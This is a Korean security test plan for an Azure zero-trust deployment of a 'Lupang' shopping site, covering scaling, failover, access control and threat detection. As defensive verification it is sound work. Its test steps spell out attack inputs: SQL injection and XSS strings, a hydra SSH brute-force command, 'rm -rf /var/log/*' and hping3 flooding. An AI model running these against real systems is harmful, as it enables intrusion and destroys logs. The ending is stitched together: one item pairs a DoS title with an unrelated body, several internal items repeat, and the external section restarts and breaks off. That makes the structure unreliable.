# 제로 트러스트 기반 보안 클라우드 및 위협 대응 통합 시나리오 정의서

## 가. 아키텍처 검증 (Architecture Verification)
**담당:** 하연, 하영 (인프라 및 가용성 중심)

**1. Web/WAS VMSS 오토스케일링 검증 (Stress Test)**
*   **담당자:** 하연
*   **내용:** `stress-ng` 도구로 CPU 부하를 인위적으로 발생시켜 VM 인스턴스가 자동으로 증가(Scale-out)하고, 부하 제거 시 감소(Scale-in)하는지 확인합니다.
*   **방법:**
    1.  VMSS 인스턴스에 접속: `az vmss nic list ...`로 IP 확인 후 SSH 접속.
    2.  부하 발생: `sudo apt-get install stress-ng && stress-ng --cpu 4 --timeout 600`
    3.  모니터링: Azure Portal '인스턴스' 탭에서 새 VM 생성 확인.
*   **참고:** Terraform `modules/Compute/02_vmss.tf`

**2. MySQL Flexible Server 고가용성(HA) Failover 테스트**
*   **담당자:** 하연
*   **내용:** Primary DB 장애 시 Standby DB로 자동 전환되는지 검증합니다.
*   **방법:**
    1.  Azure Portal MySQL '고가용성' 메뉴 접속.
    2.  [강제 장애 조치(Forced Failover)] 클릭.
    3.  웹 서비스의 DB 연결 끊김 시간(Downtime) 측정.
*   **참고:** Terraform `modules/Database/01_mysql.tf`

**3. MySQL Read Replica 데이터 복제 지연 확인**
*   **담당자:** 하연
*   **내용:** Primary DB 데이터가 Replica에 반영되는 속도(Lag)를 측정합니다.
*   **방법:**
    1.  Primary DB에 Insert 1,000건 수행.
    2.  Replica DB에서 `SELECT count(*)` 반복 조회하여 동기화 시점 확인.
*   **참고:** MySQL 복제 설정 확인

**4. Redis Cache 연결 및 성능 테스트**
*   **담당자:** 하연
*   **내용:** Redis 캐시 적용 유무에 따른 웹 응답 속도 차이를 비교합니다.
*   **방법:**
    1.  WAS에서 `redis-cli` 접속 테스트.
    2.  브라우저 개발자 도구(F12) Network 탭에서 캐시 Hit/Miss 응답 시간 비교.
*   **참고:** Terraform `modules/Database/02_redis.tf`

**5. Traffic Manager 라우팅 및 장애 조치 검증**
*   **담당자:** 하연
*   **내용:** 주 리전 장애 시 트래픽 매니저가 보조 엔드포인트로 연결하는지 확인합니다.
*   **방법:**
    1.  주 리전 공인 IP 비활성화 또는 NSG 80 포트 차단.
    2.  `nslookup www-tm-sojdyc.trafficmanager.net` 질의 시 보조 리전 IP 반환 확인.
*   **참고:** Terraform `modules/Network/04_traffic_manager.tf`

**6. Application Gateway WAF 차단 검증**
*   **담당자:** 현지 (보안 관점), 하영 (인프라 관점)
*   **내용:** 웹 공격(SQLi, XSS) 시도가 WAF에 의해 403으로 차단되는지 확인합니다.
*   **방법:**
    1.  브라우저 입력: `https://<DOMAIN>/?id=' OR 1=1 --`
    2.  결과: 403 Forbidden 페이지 확인.
*   **참고:** Terraform `modules/Network/03_app_gateway.tf` (WAF Policy)

**7. Private Endpoint 연결성 검증**
*   **담당자:** 하연
*   **내용:** 내부망(Private Subnet)에서만 DB/Storage에 접근 가능한지 확인합니다.
*   **방법:**
    1.  내부 VM에서 `nslookup <storage>.blob.core.windows.net` 실행.
    2.  결과: 사설 IP(10.x.x.x) 반환 확인 및 접속 성공.
*   **참고:** Terraform `modules/Network/05_private_endpoint.tf`

**8. Azure Bastion 접속 및 세션 유지 테스트**
*   **담당자:** 하연
*   **내용:** Bastion을 통한 보안 접속 안정성을 테스트합니다.
*   **방법:**
    1.  Azure Portal에서 Bastion을 통해 VM 연결.
    2.  10분 유휴 상태 후 재입력 시 세션 유지 여부 확인.
*   **참고:** Terraform `modules/Network/02_bastion.tf`

**9. NAT Gateway 아웃바운드 연결 확인**
*   **담당자:** 하연
*   **내용:** Private VM이 외부 통신 시 NAT Gateway IP를 사용하는지 확인합니다.
*   **방법:**
    1.  Private VM에서 `curl ifconfig.me` 실행.
    2.  결과 IP가 NAT Gateway의 공인 IP와 일치하는지 확인.
*   **참고:** Terraform `modules/Network/01_vnet.tf`

**10. VM 장애 복구 및 Health Probe 확인**
*   **담당자:** 하영
*   **내용:** 웹 서비스 다운 시 로드밸런서가 트래픽을 차단하는지 확인합니다.
*   **방법:**
    1.  특정 VM에서 `systemctl stop apache2`.
    2.  LB 상태 프로브가 'Unhealthy' 감지 후 트래픽 제외 확인.
*   **참고:** Terraform `modules/Compute/03_load_balancer.tf`

**11. L4 Load Balancer 부하 분산 확인**
*   **담당자:** 하영
*   **내용:** 트래픽이 백엔드 VM들에 고르게 분산되는지 확인합니다.
*   **방법:**
    1.  `for` 문으로 `curl` 반복 요청.
    2.  각 VM의 `/var/log/apache2/access.log` 확인하여 요청 유입 분산 확인.
*   **참고:** Session Persistence(Client IP) 설정 여부 확인

**12. VMSS 수동 스케일링**
*   **담당자:** 하연
*   **내용:** 수동으로 인스턴스 수를 조정하여 즉시 반영되는지 확인합니다.
*   **방법:**
    1.  Portal VMSS 메뉴 -> 크기 조정 -> '수동' 선택.
    2.  인스턴스 수 증가 설정 후 저장, 생성 속도 측정.
*   **참고:** Terraform `modules/Compute/02_vmss.tf`

**13. Storage Account GRS(Geo-Redundant) 확인**
*   **담당자:** 하연
*   **내용:** 데이터가 보조 리전으로 복제 설정되어 있는지 확인합니다.
*   **방법:**
    1.  Storage Account -> '지리적 복제' 메뉴 확인.
    2.  보조 위치 상태가 'Available'인지 확인 (Failover 테스트는 생략).
*   **참고:** Terraform `modules/Storage/01_storage_account.tf`

**14. Azure Function 트리거 동작 테스트**
*   **담당자:** 하영
*   **내용:** Blob 업로드 시 Function이 자동 실행되는지 확인합니다.
*   **방법:**
    1.  Storage Container에 이미지 업로드.
    2.  Function App '모니터' 탭에서 실행 로그(Success) 확인.
*   **참고:** Terraform `modules/Serverless/01_function.tf`

**15. Service Bus 메시지 큐 처리**
*   **담당자:** 하연
*   **내용:** 메시지 큐 송수신 동작을 검증합니다.
*   **방법:**
    1.  Service Bus Explorer로 메시지 전송.
    2.  연동된 Logic App 또는 VM 스크립트에서 수신 로그 확인.
*   **참고:** Terraform `modules/Serverless/02_service_bus.tf`

**16. ACR(Azure Container Registry) 이미지 풀 테스트**
*   **담당자:** 하연
*   **내용:** Private ACR에서 이미지를 정상적으로 Pull 하는지 확인합니다.
*   **방법:**
    1.  VM 접속 -> `az acr login`.
    2.  `docker pull <acr>.azurecr.io/image:tag` 성공 여부 확인.
*   **참고:** Terraform `modules/Container/01_acr.tf`

**17. 내부 DNS 해석(Name Resolution) 검증**
*   **담당자:** 하연
*   **내용:** Private Link 리소스의 DNS가 내부 IP로 해석되는지 확인합니다.
*   **방법:** `nslookup <리소스FQDN>` 실행 시 10.x.x.x IP 반환 확인.
*   **참고:** Private DNS Zone 설정

**18. Hub-Spoke 네트워크 지연 시간(Latency) 측정**
*   **담당자:** 하연
*   **내용:** VNet Peering 간 통신 지연을 측정합니다.
*   **방법:** Hub(Bastion) -> Spoke(Web VM) 간 `ping` 또는 `fping` 수행.
*   **참고:** Peering 구성 확인

**19. App Gateway SSL/TLS 오프로딩 및 정책 확인**
*   **담당자:** 하영
*   **내용:** HTTPS 접속 및 TLS 1.2 강제 설정을 확인합니다.
*   **방법:**
    1.  브라우저 인증서 자물쇠 확인.
    2.  `openssl s_client -tls1_1 ...` 명령으로 구버전 접속 실패 확인.
*   **참고:** Terraform `modules/Network/03_app_gateway.tf`

**20. VM 백업 및 복구 테스트 (Azure Backup)**
*   **담당자:** 하영
*   **내용:** 파일 손실 시 백업본을 통한 복구를 시연합니다.
*   **방법:**
    1.  VM 내 파일 삭제.
    2.  Recovery Services Vault -> 파일 복구(File Recovery) 스크립트 실행 및 복원.
*   **참고:** Terraform `modules/Management/01_backup.tf`

**(Lupang 쇼핑몰 특화 아키텍처)**

**21. Lupang 쇼핑몰 동시 접속자 부하 테스트**
*   **담당자:** 하연
*   **내용:** 웹 서버 처리량 한계를 측정합니다.
*   **방법:** `ab -n 1000 -c 100 https://<URL>/` 실행, TPS 측정.
*   **참고:** Apache Benchmark 도구

**22. Lupang DB 연결 풀(Connection Pool) 고갈 테스트**
*   **담당자:** 하연
*   **내용:** DB 과부하 시 웹 서비스의 거동을 확인합니다.
*   **방법:** JMeter로 DB 조회 집중 요청, 'Too many connections' 에러 발생 확인.
*   **참고:** PHP/MySQL 설정

**23. 상품 이미지 CDN 전송 속도 비교**
*   **담당자:** 하연
*   **내용:** CDN 적용 유무에 따른 로딩 속도를 측정합니다.
*   **방법:** 원본 Storage URL vs CDN URL 이미지 로딩 시간 비교 (개발자 도구).
*   **참고:** Azure Front Door 또는 CDN Profile

**24. Lupang 로그 파일 수집 확인**
*   **담당자:** 하연
*   **내용:** 앱 로그가 Log Analytics로 중앙 수집되는지 확인합니다.
*   **방법:** Log Analytics 쿼리창에서 `Syslog | where Message contains "Lupang"` 조회.
*   **참고:** Log Analytics Agent 설정

**25. 세션 지속성(Session Affinity) 테스트**
*   **담당자:** 하연
*   **내용:** 로그인 사용자가 동일 서버로 계속 연결되는지 확인합니다.
*   **방법:** 쿠키 기반 세션 유지 설정 후, 페이지 이동 시 백엔드 IP 변경 없는지 확인.
*   **참고:** App Gateway 'Cookie-based affinity' 설정

**26. 상품 업로드 시 Storage 연동 확인**
*   **담당자:** 하연
*   **내용:** 웹에서 업로드한 파일이 Blob Storage에 저장되는지 확인합니다.
*   **방법:** 쇼핑몰 상품 등록 -> Storage Explorer에서 해당 파일 생성 확인.
*   **참고:** PHP Storage 연동 코드

**27. Apache 웹서버 재시작 시 무중단 확인**
*   **담당자:** 하연
*   **내용:** 서비스 재시작 중 로드밸런서의 제외 동작을 확인합니다.
*   **방법:** `watch curl` 걸어놓고 `systemctl restart apache2` 수행 시 500 에러 발생 여부 확인.
*   **참고:** Connection Draining 설정

**28. Lupang 검색 기능 응답 속도 테스트**
*   **담당자:** 하연
*   **내용:** DB 인덱스 효율성을 검증합니다.
*   **방법:** 쿼리 실행 계획 확인 및 검색 속도 측정.
*   **참고:** MySQL Index 설정

**29. HTTP -> HTTPS 리디렉션 확인**
*   **담당자:** 하연
*   **내용:** 보안 접속 강제 여부를 확인합니다.
*   **방법:** `curl -I http://<URL>` 실행 시 `301 Moved Permanently` 및 `Location: https://...` 확인.
*   **참고:** App Gateway Routing Rule

**30. Read Replica 실시간 데이터 검증**
*   **담당자:** 하연
*   **내용:** 읽기 전용 DB의 데이터 최신성을 확인합니다.
*   **방법:** Primary에 쓰기 후 즉시 Replica 조회, 지연 시간 확인.
*   **참고:** MySQL Replication Status

---

## 나. 내부 보안 (Internal Security)
**담당:** 기훈, 윤철, 하영 (거버넌스, 데이터/ID 보안, 정책)

**1. Entra ID (Azure AD) RBAC 권한 분리**
*   **담당자:** 기훈
*   **내용:** 사용자 역할에 따른 리소스 접근 제어를 검증합니다.
*   **방법:** Reader 권한 사용자로 로그인하여 리소스 생성 시도 -> '권한 없음' 실패 확인.
*   **참고:** Terraform `modules/Identity/02_role_assignments.tf`
*   **검증 쿼리:** `AzureActivity | where OperationNameValue contains "ROLEASSIGNMENTS"`

**2. Azure Policy 리소스 생성 제한**
*   **담당자:** 기훈
*   **내용:** 허용되지 않은 리전(Region)에 리소스 생성을 차단합니다.
*   **방법:** '미국 동부' 리전에 리소스 생성 시도 -> 정책 위반으로 배포 실패 확인.
*   **참고:** Terraform `modules/Governance/01_azure_policy.tf`

**3. Key Vault 비밀(Secret) 관리 및 연동**
*   **담당자:** 기훈
*   **내용:** 코드에서 비밀번호를 제거하고 Key Vault에서 호출합니다.
*   **방법:** VM에서 `az login --identity` 후 `az keyvault secret show`로 DB 패스워드 조회 성공 확인.
*   **참고:** Terraform `modules/Security/02_key_vault.tf`

**4. Storage Account SAS 보안**
*   **담당자:** 기훈
*   **내용:** SAS 토큰의 권한 제한(읽기 전용, IP 제한)을 테스트합니다.
*   **방법:** 쓰기 권한 없는 SAS로 파일 업로드 시도 -> 403 에러 확인.
*   **참고:** Terraform `modules/Storage/01_storage_account.tf`

**5. Azure SQL Database TDE 및 데이터 마스킹**
*   **담당자:** 윤철
*   **내용:** 데이터 암호화 및 민감 정보 마스킹을 확인합니다.
*   **방법:**
    1.  TDE 설정 'On' 확인.
    2.  일반 권한으로 주민번호 컬럼 조회 시 `XXX-XX`로 가려지는지 확인.
*   **참고:** Terraform `modules/Database/01_mysql.tf` (관련 설정)

**6. DB 방화벽 및 VNet 규칙 설정**
*   **담당자:** 기훈
*   **내용:** 공용 네트워크 접근을 차단하고 특정 서브넷만 허용합니다.
*   **방법:** 외부망에서 DB 접속 시도(실패) vs 내부 VM에서 접속 시도(성공) 비교.
*   **참고:** Terraform `modules/Database/01_mysql.tf` (firewall_rule)

**7. Managed Identity(관리 ID) 활용**
*   **담당자:** 윤철
*   **내용:** 자격 증명 관리의 편의성과 보안성을 확인합니다.
*   **방법:** VM에 할당된 Managed Identity를 통해 Key Vault/Storage에 접근.
*   **참고:** Terraform `modules/Identity/01_managed_identity.tf`

**8. NSG(네트워크 보안 그룹) Flow Logs 분석**
*   **담당자:** 기훈
*   **내용:** 네트워크 트래픽 로그 저장 여부를 확인합니다.
*   **방법:** Network Watcher 설정 확인 및 Storage에 저장된 `PT1H.json` 로그 파일 확인.
*   **참고:** Terraform `modules/Security/01_network_security_group.tf`
*   **제한사항:** 2025.06.30 정책 변경으로 신규 생성 불가 시 기존 로그 확인으로 대체.

**9. Azure Disk Encryption (ADE) 적용**
*   **담당자:** 기훈
*   **내용:** VM 디스크 암호화 적용 상태를 확인합니다.
*   **방법:** CLI `az vm encryption show` 실행 -> "Encrypted" 상태 확인.
*   **참고:** Terraform `modules/Security/03_disk_encryption.tf`

**10. 데이터베이스 시점 복원 (PITR)**
*   **담당자:** 윤철
*   **내용:** 데이터 손실 상황을 가정하고 특정 시점으로 복원합니다.
*   **방법:** 데이터 삭제 후 Azure Portal에서 '시점 복원' 수행하여 데이터 복구 확인.
*   **참고:** MySQL Backup Configuration

**11. 조건부 액세스(Conditional Access) - MFA 강제**
*   **담당자:** 하영
*   **내용:** **[제한사항]** Azure AD Premium P1 라이선스 없음으로 조건부 액세스 사용 불가.
*   **대안:** '보안 기본값(Security Defaults)' 활성화로 MFA 동작 확인 또는 수동 테스트.
*   **방법:** Entra ID -> 속성 -> 보안 기본값 관리 -> 활성화.

**12. 사용자 지정 RBAC 역할 생성 및 할당**
*   **담당자:** 기훈
*   **내용:** 최소 권한 원칙을 위한 커스텀 역할을 테스트합니다.
*   **방법:** 'VM 재부팅만 가능' 역할 생성 후 할당. 재부팅(성공) 및 삭제(실패) 테스트.
*   **참고:** `modules/Identity/03_custom_roles.tf`

**13. Resource Lock(자원 잠금) 설정**
*   **담당자:** 기훈
*   **내용:** 중요 리소스 삭제 방지를 검증합니다.
*   **방법:** 운영 DB 리소스 그룹에 `CanNotDelete` 락 설정 후 삭제 시도 -> 에러 확인.
*   **참고:** Terraform `modules/Governance/02_resource_lock.tf`

**14. ACR 취약점 스캔 (Defender for Containers)**
*   **담당자:** 윤철, 하영
*   **내용:** 컨테이너 이미지의 취약점을 탐지합니다.
*   **방법:** 취약한 이미지 Push 후 Defender for Cloud 권장 사항에서 리포트 확인.
*   **참고:** Terraform `modules/Security/08_defender.tf`

**15. Key Vault 키 자동 회전(Rotation) 시뮬레이션**
*   **담당자:** 윤철
*   **내용:** 암호화 키 갱신 프로세스를 확인합니다.
*   **방법:** Key Vault에서 키 새 버전 생성. 애플리케이션이 구버전/신버전 키로 복호화 가능한지 확인.
*   **참고:** Key Vault Rotation Policy

**16. SQL Database 감사(Auditing) 로그 확인**
*   **담당자:** 기훈
*   **내용:** DB 작업 이력을 기록하고 조회합니다.
*   **방법:** 쿼리 실행 후 Log Analytics에서 `AzureDiagnostics | where Category == "SQLSecurityAuditEvents"` 조회.
*   **참고:** Terraform SQL Auditing Settings

**17. JIT(Just-In-Time) VM 액세스**
*   **담당자:** 윤철
*   **내용:** **[제한사항]** Defender for Servers Plan 2 필요. 미구독 시 테스트 불가.
*   **방법:** (가능 시) 포트 22번 닫힘 확인 -> JIT 요청 승인 -> 접속 성공 확인.
*   **대안:** NSG 수동 제어 프로세스로 대체 설명.

**18. 파일 무결성 모니터링(FIM)**
*   **담당자:** 기훈
*   **내용:** 중요 시스템 파일 변조를 탐지합니다.
*   **방법:** `/etc/passwd` 수정 후 Defender 보안 경고 발생 확인.
*   **참고:** Defender for Servers 설정

**19. Subnet 간 NSG 차단 검증**
*   **담당자:** 윤철, 하영
*   **내용:** 내부망 횡적 이동(Lateral Movement) 차단을 검증합니다.
*   **방법:** Web 서버에서 DB 서버로 SSH(22) 접속 시도 -> Timeout(차단) 확인.
*   **참고:** Terraform `modules/Security/01_network_security_group.tf`

**20. Purview 정보 보호 레이블 적용**
*   **담당자:** 하영
*   **내용:** 데이터 민감도 레이블 적용을 테스트합니다.
*   **방법:** 문서에 '기밀' 레이블 적용. 정책에 따라 워터마크 또는 접근 제한 동작 확인.
*   **참고:** Microsoft Purview Compliance Portal

**(Lupang 앱 보안 및 인증)**

**21. Lupang 인증 토큰(lupang_token) 보안**
*   **담당자:** 윤철
*   **내용:** 토큰 위변조 방지 로직을 검증합니다.
*   **방법:** 브라우저 쿠키 편집기로 토큰 값 임의 변경 후 새로고침 -> 강제 로그아웃 확인.
*   **참고:** PHP JWT/Signature 검증 로직

**22. SQL Injection 공격 차단 (login.php)**
*   **담당자:** 윤철
*   **내용:** 로그인 폼 대상 인젝션 공격 방어를 확인합니다.
*   **방법:** ID에 `' OR '1'='1` 입력. Prepared Statement 적용으로 로그인 실패(방어 성공) 확인.
*   **참고:** PHP PDO Prepared Statement

**23. SQL Injection 공격 차단 (product.php)**
*   **담당자:** 윤철
*   **내용:** URL 파라미터 조작 공격 방어를 확인합니다.
*   **방법:** `product.php?id=1 UNION SELECT...` 입력 시 데이터 유출 없는지 확인.
*   **참고:** Secure Coding 적용

**24. XSS(Cross-Site Scripting) 공격 차단**
*   **담당자:** 윤철
*   **내용:** 스크립트 삽입 공격 방어를 확인합니다.
*   **방법:** 게시판/검색창에 `<script>alert(1)</script>` 입력. 실행되지 않고 텍스트로 출력됨을 확인.
*   **참고:** `htmlspecialchars()` 함수 적용

**25. 파일 업로드 취약점 검증**
*   **담당자:** 윤철
*   **내용:** 악성 웹쉘 업로드 차단을 확인합니다.
*   **방법:** `.php` 파일 업로드 시도 -> 확장자 필터링으로 거부되거나 실행 권한 없음 확인.
*   **참고:** Upload 디렉토리 권한 설정 (`chmod -x`)

**26. 세션 하이재킹 방지**
*   **담당자:** 윤철
*   **내용:** 세션 탈취 시도 시 차단을 확인합니다.
*   **방법:** 다른 브라우저/IP에서 탈취한 쿠키값 주입 -> 접속 거부 확인.
*   **참고:** User-Agent/IP 검증 로직

**27. 관리자 권한 우회 시도 탐지**
*   **담당자:** 윤철
*   **내용:** 권한 변조 시도를 차단합니다.
*   **방법:** 일반 유저 쿠키의 role 값을 `admin`으로 변조 후 관리자 페이지 접속 시도 -> 차단 확인.
*   **참고:** 서버 사이드 세션 검증

**28. CSRF 공격 방지**
*   **담당자:** 윤철
*   **내용:** 위조된 요청 차단을 확인합니다.
*   **방법:** 별도 HTML 파일에서 Lupang 게시글 작성 폼 Submit(토큰 없이) -> 실패 확인.
*   **참고:** CSRF Token 검증 로직

**29. 민감한 정보 노출 방지 (DB 비밀번호)**
*   **담당자:** 윤철
*   **내용:** 소스코드 보안을 점검합니다.
*   **방법:** `grep`으로 소스 내 비밀번호 하드코딩 없음 확인. Managed Identity 사용 확인.
*   **참고:** `db_config.php` 수정

**30. Lupang 애플리케이션 로그 암호화/권한**
*   **담당자:** 윤철
*   **내용:** 로그 파일 접근 통제를 확인합니다.
*   **방법:** `ls -l /var/log/lupang.log` 권한 확인(root only). 내용 중 민감정보 마스킹 확인.
*   **참고:** Log file permission setting

---

## 다. 외부 보안 (External Security)
**담당:** 현지 (Sentinel, 위협 탐지, SOAR)

**1. Microsoft Sentinel 데이터 커넥터 연결**
*   **담당자:** 현지
*   **내용:** 로그 수집 체계를 구축합니다.
*   **방법:** Sentinel '데이터 커넥터'에서 Azure Activity, Syslog 등 연결.
*   **참고:** **[제한사항]** AAD 등 일부 커넥터는 전역 관리자 권한 필요하여 수동 활성화. `99_disabled.md` 참조.

**2. SSH Brute Force 공격 탐지**
*   **담당자:** 현지
*   **내용:** SSH 무차별 대입 공격을 탐지합니다.
*   **방법:**
    1.  공격 대상 IP 확인: `az vmss nic list ...`
    2.  공격 실행(Kali): `hydra -l www -P rockyou.txt ssh://<IP> -t 4`
    3.  Sentinel 탐지: `Syslog | where SyslogMessage contains "Failed password" ...` (제공된 쿼리 사용)
*   **참고:** Terraform `modules/Security/07_sentinel_rules.tf`

**3. 악성 IP 통신 탐지 (Threat Intelligence)**
*   **담당자:** 현지
*   **내용:** TI 기반 위협 탐지를 검증합니다.
*   **방법:** 악성 평판 IP로 `curl` 요청 시도 -> Sentinel 인시던트 생성 확인.
*   **참고:** Sentinel Threat Intelligence Connector

**4. KQL(Kusto Query Language) 기반 위협 분석**
*   **담당자:** 현지
*   **내용:** 로그 분석 역량을 검증합니다.
*   **방법:** Log Analytics에서 사용자 지정 쿼리 작성 및 결과 분석.
*   **참고:** `Log Analytics Workspace` 구성됨

**5. Defender for Cloud (CSPM) 보안 권고 사항 확인**
*   **담당자:** 현지
*   **내용:** 클라우드 보안 형상 관리(CSPM)를 수행합니다.
*   **방법:** Defender 대시보드에서 보안 점수(Secure Score) 확인 및 권고 사항(MFA 미설정 등) 확인.
*   **참고:** Terraform `modules/Security/08_defender.tf`

**6. VM 멀웨어 탐지 시뮬레이션 (EICAR)**
*   **담당자:** 현지
*   **내용:** 엔드포인트 보안 솔루션 동작을 확인합니다.
*   **방법:** VM에서 EICAR 테스트 파일 다운로드 -> Defender가 격리 및 알림 발송 확인.
*   **참고:** Defender for Servers

**7. Sentinel 분석 규칙(Analytics Rule) 생성**
*   **담당자:** 현지
*   **내용:** 사용자 정의 탐지 규칙을 생성합니다.
*   **방법:** Sentinel -> 분석 -> 규칙 만들기 -> KQL 입력 -> 활성화.
*   **참고:** Terraform `modules/Security/07_sentinel_rules.tf`

**8. SOAR 자동화 대응 (Logic App Playbook)**
*   **담당자:** 현지
*   **내용:** 보안 사고 자동 대응을 구현합니다.
*   **방법:** 인시던트 발생 시 Logic App 트리거 -> Teams/메일 알림 수신 확인.
*   **참고:** Logic App Playbook 구성

**9. 의심스러운 프로세스 실행 탐지**
*   **담당자:** 현지
*   **내용:** 비정상 프로세스(채굴기 등)를 탐지합니다.
*   **방법:** 프로세스 명을 채굴기 이름(예: `xmrig`)으로 가장하여 실행 -> Defender 탐지 확인.
*   **참고:** Defender Endpoint Protection

**10. 보안 사고(Incident) 조사 및 종결**
*   **담당자:** 현지
*   **내용:** 관제 프로세스의 마무리를 수행합니다.
*   **방법:** Sentinel 조사 그래프 분석 -> 근본 원인 파악 -> 상태 'Closed' 변경.
*   **참고:** Sentinel Incident Management

**11. DDoS 공격 시뮬레이션 (Basic)**
*   **담당자:** 현지
*   **내용:** **[제한사항]** DDoS Protection Standard 미사용(비용). Basic 방어만 확인.
*   **방법:** `hping3`로 패킷 전송. 서비스 가용성 모니터링.

**12. 데이터 유출(Data Exfiltration) 시도 탐지**
*   **담당자:** 현지
*   **내용:** 외부로의 대용량 데이터 전송을 탐지합니다.
*   **방법:** 내부 VM -> 외부 서버 SCP 대용량 전송 -> Network Watcher/Sentinel 트래픽 급증 탐지.
*   **참고:** Network Anomaly Detection

**13. 웹쉘(Web Shell) 업로드 및 실행 차단**
*   **담당자:** 현지
*   **내용:** 웹 서버 침해 시도를 탐지/차단합니다.
*   **방법:** 웹쉘 파일 업로드 시도. Defender가 악성 파일로 식별하여 삭제하는지 확인.
*   **참고:** Defender for Servers

**14. 권한 상승(Privilege Escalation) 시도**
*   **담당자:** 현지
*   **내용:** 시스템 권한 탈취 시도를 탐지합니다.
*   **방법:** `sudo` 권한 없는 계정으로 명령어 반복 실패. `Syslog` 기반 탐지 쿼리 확인.
*   **참고:** Linux Audit Logs

**15. 포트 스캐닝(Port Scanning) 탐지**
*   **담당자:** 현지
*   **내용:** 정찰 행위를 탐지합니다.
*   **방법:** 외부에서 `nmap` 스캔 수행. Sentinel에서 스캔 패턴 탐지 룰 트리거 확인.
*   **참고:** `modules/Security/07_sentinel_rules.tf` (port_scan 규칙 수정 필요)

**16. 랜섬웨어 행위 모의 실험**
*   **담당자:** 현지
*   **내용:** 파일 일괄 변조 행위를 탐지합니다.
*   **방법:** 스크립트로 다수 파일 확장자 변경 시도 -> Defender 이상 행위 탐지.
*   **참고:** Defender Endpoint Behavioral Analysis

**17. 불가능한 여행(Impossible Travel) 로그인**
*   **담당자:** 현지
*   **내용:** **[제한사항]** AAD P2(Identity Protection) 없음.
*   **대안:** Sentinel 사용자 지정 규칙으로 구현(서로 다른 IP가 짧은 시간 내 접속).
*   **방법:** VPN 활용하여 한국/미국 IP로 연속 로그인 시도 후 탐지 확인.

**18. 로그 삭제/변조 시도 탐지**
*   **담당자:** 현지
*   **내용:** 침해 흔적 삭제 행위를 탐지합니다.
*   **방법:** `rm -rf /var/log/*` 명령 실행. Auditd 로그를 통해 Sentinel 알림 발생 확인.
*   **참고:** Linux Auditd Configuration

**19. 알려진 취약점(CVE) 익스플로잇 시도**
*   **담당자:** 현지
*   **내용:** 취약점 공격 탐지를 확인합니다.
*   **방법:** Metasploit 등으로 취약점 공격 패킷 전송. IPS/WAF 차단 로그 확인.
*   **참고:** Threat Intelligence Matching

**20. 비정상적인 프로세스/서비스 등록 탐지**
*   **담당자:** 현지
*   **내용:** 지속성(Persistence) 확보 시도를 탐지합니다.
*   **방법:** `systemd` 서비스 등록 시도. Defender FIM 또는 프로세스 모니터링 탐지 확인.
*   **참고:** Defender for Servers

**(Lupang 특화 위협 탐지)**

**21. Lupang 로그인 Brute Force 공격 탐지**
*   **담당자:** 현지
*   **내용:** 앱 레벨의 무차별 대입 공격을 탐지합니다.
*   **방법:** SSH Brute Force 규칙을 응용하여 앱 로그(`Login Failed`) 기반 탐지.
*   **참고:** `modules/Security/07_sentinel_rules.tf`

**22. SQL Injection 공격 시도 자동 탐지 및 차단**
*   **담당자:** 현지
*   **내용:** 공격 IP 자동 차단(SOAR)을 검증합니다.
*   **방법:** SQL Injection 시도 -> Sentinel 탐지 -> Logic App 실행 -> NSG IP 차단.
*   **참고:** Logic App Playbook (Block-IP)

**23. 관리자 권한 무단 접근 탐지**
*   **담당자:** 현지
*   **내용:** 민감 기능 접근을 모니터링합니다.
*   **방법:** 관리자 페이지 'DB Dump' 클릭 -> 앱 로그 기록 -> Sentinel 알림 발생.
*   **참고:** Custom Log Collection

**24. XSS 공격 시도 로그 분석**
*   **담당자:** 현지
*   **내용:** WAF 로그 분석을 수행합니다.
*   **방법:** WAF가 차단한 XSS 로그를 Log Analytics에서 조회 및 분석.
*   **쿼리:** `AzureDiagnostics | where Category == "ApplicationGatewayFirewallLog"` (스키마 확인 필요)

**25. 의심스러운 토큰 조작 탐지**
*   **담당자:** 현지
*   **내용:** 인증 토큰 이상 징후를 탐지합니다.
*   **방법:** 동일 IP에서 토큰 값이 빈번하게 변경되는 패턴 탐지 쿼리 작성.
*   **참고:** KQL Custom Rule

**26. 비정상적인 대량 상품 조회 패턴 탐지**
*   **담당자:** 현지
*   **내용:** 크롤링/매크로 의심 행위를 탐지합니다.
*   **방법:** 1분 내 100회 이상 페이지 조회 시도. Sentinel 임계치 기반 룰 탐지.
*   **참고:** Rate Limiting Detection

**27. 웹쉘 업로드 시도 탐지 (uploads 디렉토리)**
*   **담당자:** 현지
*   **내용:** 파일 업로드 공격을 탐지합니다.
*   **방법:** `uploads` 폴더에 실행 파일 생성 시 Defender/FIM 탐지 확인.
*   **참고:** Defender File Protection

**28. Lupang 서비스 중단(DoS) 탐지 및 복구**
*   **담당자:** 윤철
*   **내용:** 권한 변조 시도를 차단합니다.
*   **방법:** 일반 유저 쿠키의 role 값을 `admin`으로 변조 후 관리자 페이지 접속 시도 -> 차단 확인.
*   **참고:** 서버 사이드 세션 검증

**28. CSRF 공격 방지**
*   **담당자:** 윤철
*   **내용:** 위조된 요청 차단을 확인합니다.
*   **방법:** 별도 HTML 파일에서 Lupang 게시글 작성 폼 Submit(토큰 없이) -> 실패 확인.
*   **참고:** CSRF Token 검증 로직

**29. 민감한 정보 노출 방지 (DB 비밀번호)**
*   **담당자:** 윤철
*   **내용:** 소스코드 보안을 점검합니다.
*   **방법:** `grep`으로 소스 내 비밀번호 하드코딩 없음 확인. Managed Identity 사용 확인.
*   **참고:** `db_config.php` 수정

**30. Lupang 애플리케이션 로그 암호화/권한**
*   **담당자:** 윤철
*   **내용:** 로그 파일 접근 통제를 확인합니다.
*   **방법:** `ls -l /var/log/lupang.log` 권한 확인(root only). 내용 중 민감정보 마스킹 확인.
*   **참고:** Log file permission setting

---

## 다. 외부 보안 (External Security)
**담당:** 현지 (Sentinel, 위협 탐지, SOAR)

**1. Microsoft Sentinel 데이터 커넥터 연결**
*   **담당자:** 현지
*   **내용:** 로그 수집 체계를 구축합니다.
*   **방법:** Sentinel '데이터 커넥터'에서 Azure Activity, Syslog 등 연결.
*   **참고:** **[제한사항]** AAD 등 일부 커넥터는 전역 관리자 권한 필요하여 수동 활성화. `99_disabled.md` 참조.

**2. SSH Brute Force 공격 탐지**
*   **담당자:** 현지
*   **내용:** SSH 무차별 대입 공격을 탐지합니다.
*   **방법:**
    1.  공격 대상 IP 확인: `az vmss nic list ...`
    2.  공격 실행(Kali): `hydra -l www -P rockyou.txt ssh://<IP> -t 4`
    3.  Sentinel 탐지: `Syslog | where SyslogMessage contains "Failed password" ...` (제공된 쿼리 사용)
*   **참고:** Terraform `modules/Security/07_sentinel_rules.tf`

**3. 악성 IP 통신 탐지 (Threat Intelligence)**
*   **담당자:** 현지
